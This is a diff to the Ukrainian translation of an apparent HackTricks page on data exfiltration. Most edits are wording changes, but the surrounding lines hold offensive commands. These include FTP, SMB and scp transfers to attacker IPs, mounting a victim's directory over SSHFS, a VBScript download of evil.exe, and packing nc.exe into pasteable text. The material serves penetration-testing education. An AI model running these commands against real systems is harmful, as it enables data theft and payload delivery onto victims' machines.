@@ -1,12 +1,12 @@
-# Exfiltration
+# Екстракція
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Загальновідомі домени, які дозволяють ексфільтрацію інформації
+## Загальновідомі домени, які дозволяють екстракцію інформації
 
 Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти загальновідомі домени, які можна зловживати
 
-## Copy\&Paste Base64
+## Копіювати\&Вставити Base64
 
 **Linux**
 ```bash
@@ -130,7 +130,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** клієнт
+### **Клієнт Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -165,7 +165,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Вікна
+Віндовс
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -181,7 +181,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви на зловмисника.
+Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви до зловмисника.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -228,13 +228,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Якщо ви можете надіслати дані на SMTP сервер, ви можете створити SMTP для отримання даних за допомогою python:
+Якщо ви можете надсилати дані на SMTP сервер, ви можете створити SMTP для отримання даних за допомогою python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-За замовчуванням у XP та 2003 (в інших його потрібно явно додати під час встановлення)
+За замовчуванням у XP та 2003 (в інших його потрібно явно додати під час установки)
 
 У Kali, **запустіть TFTP сервер**:
 ```bash
@@ -302,8 +302,12 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Тоді скопіюйте та вставте текст у windows-shell, і файл з назвою nc.exe буде створено.
+Потім вставте текст у вікно командного рядка Windows, і буде створено файл з назвою nc.exe.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
